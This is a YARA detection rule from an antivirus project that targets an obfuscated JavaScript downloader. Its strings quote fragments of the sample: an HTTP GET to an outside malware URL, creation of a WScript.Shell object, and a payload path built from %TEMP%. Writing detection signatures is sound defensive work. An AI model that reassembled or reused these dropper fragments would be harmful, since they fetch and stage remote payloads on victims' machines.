rule sig_20160427_2d5de473d22d35b39f6ec97c7617d5ca {
  meta:
    description = "datamaliciousorder - file 20160427_2d5de473d22d35b39f6ec97c7617d5ca.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "235220016026c6288fa2f99e66ead30d3d4a8d185b5f6070286c3ba15d52d739"

  strings:
    $s1  = "LfucgUjnpj[UuxvpGacds](\"G\" + \"ET\", \"http://totaltransport.com.br/n7dus\", false);" fullword ascii
    $s2  = "function PygehWajvh(RkspcPglab, RqnnsMqoki){KyejgMuowb = KyejgMuowb * 1; return RkspcPglab - RqnnsMqoki;};" fullword ascii
    $s3  = "var IfmmpVkpnx = this[\"WScript\"];" fullword ascii
    $s4  = "function TvtpaXrvnn() {return EbncaKyxki[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"uhFT4d5" ascii
    $s5  = "function TvtpaXrvnn() {return EbncaKyxki[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"uhFT4d5" ascii
    $s6  = "if (LfucgUjnpj[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s7  = "function GgyytCsrxc(){return AjqpjQzohk + \"\";};" fullword ascii
    $s8  = "var EbncaKyxki = function HgisaOrlls() {return IfmmpVkpnx[MfsfgReejb](\"WScript\"+\".Shell\");}(), OojruRniel = 11;" fullword ascii
    $s9  = "function IsatbNxodx() {return ((HgwqfQkuik == true) && (HgwqfQkuik == BxvzyWktrj)) ? 1 : KyejgMuowb;};" fullword ascii
    $s10 = "function PuamtQdtsv(){return 23;};" fullword ascii
    $s11 = "var KfxnyZvmcp = false;" fullword ascii
    $s12 = "}while (SixhtQveqg);" fullword ascii
    $s13 = "BxvzyWktrj = true; " fullword ascii
    $s14 = "HgwqfQkuik = true; " fullword ascii
    $s15 = "var ScxlzNllek = new this[\"D\"+\"ate\"]();" fullword ascii
    $s16 = "function TonrtBdaqx()" fullword ascii
    $s17 = "function CdmxjFosve(XblexRbqqj) {var XlxpoJzgph = (1, 2, 3, 4, 5, XblexRbqqj); return XlxpoJzgph;};" fullword ascii
    $s18 = "function YbotjZvudq(){return MfsfgReejb;};" fullword ascii
    $s19 = "return PygehWajvh(OxavkIotpg, DskihMoxag);" fullword ascii
    $s20 = "KfxnyZvmcp = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}